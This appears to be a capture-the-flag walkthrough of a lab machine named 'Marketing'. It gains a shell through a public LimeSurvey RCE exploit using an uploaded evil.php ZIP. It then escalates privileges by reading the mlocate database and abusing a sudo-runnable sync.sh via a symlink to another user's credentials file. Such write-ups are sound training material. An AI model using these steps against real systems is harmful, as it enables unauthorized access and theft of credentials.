# 🧠 Marketing (Linux)

## 🌐 Initial Foothold

- Found `/old` directory on the web app.
- Discovered a link with domain name `customers-survey.marketing.pg`, which was not resolvable.
- ✅ Added the following entry to `/etc/hosts` to access the subdomain:
  ```bash
  192.168.173.225 customers-survey.marketing.pg
  ```
- Navigated to `http://customers-survey.marketing.pg` and accessed the customer survey page.

### 🔎 Alternative Method

- Used `curl` to compare the `/old` and new page:
  ```bash
  curl http://marketing.pg/old/ > old.txt
  curl http://marketing.pg/ > new.txt
  diff old.txt new.txt
  ```
- Added the proper domain to `/etc/hosts` as above.

### 💥 Exploitation

- Discovered a vulnerable version of LimeSurvey.
- Used [LimeSurvey RCE Exploit](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE).
- Uploaded malicious ZIP to trigger RCE:
  ```bash
  zip payload.zip evil.php
  ```
- Gained shell access and ran `linpeas.sh`.
- Found credentials for user `t.miller` and logged in.

---

## 🧑‍💻 Privilege Escalation

- Ran `linpeas.sh` again and noted:
  - Belongs to group `mlocate`
  - Can run `sync.sh` as user `m.sander` using `sudo`.

### 🔓 Read m.sander’s Credentials

- Searched for files owned by group `mlocate`:
  ```bash
  find / -group mlocate 2>/dev/null | grep -v '^/proc\|^/run\|^/sys\|^/snap'
  cat /var/lib/mlocate/mlocate.db
  ```
- Found `/home/m.sander/personal/creds-for-2022.txt`.

### 🔁 Abused Sync Script with Symlink

- Created symbolic link to `creds-for-2022.txt`:
  ```bash
  ln -sf /home/m.sander/personal/creds-for-2022.txt /tmp/fakefile
  sudo -u m.sander /usr/bin/sync.sh /tmp/fakefile
  ```

### ✅ Notes

- Used `sudo -u` to run command as another user.
- Bypassed access limitation via symlink to m.sander's home.

---

## 🧾 Git Commands for Merging Walkthrough

```bash
# 📁 Move the file to the linux walkthroughs folder
mv ~/Downloads/Marketing.md ~/Downloads/walkthroughs_project_template/linux/Marketing.md

# 🔄 Change directory to the project root
cd ~/Downloads/walkthroughs_project_template

# ➕ Add all changes to git
git add .

# 📝 Commit the changes with a descriptive message
git commit -m "Added Marketing (Linux) walkthrough"

# 🚀 Push the commit to GitHub
git push
```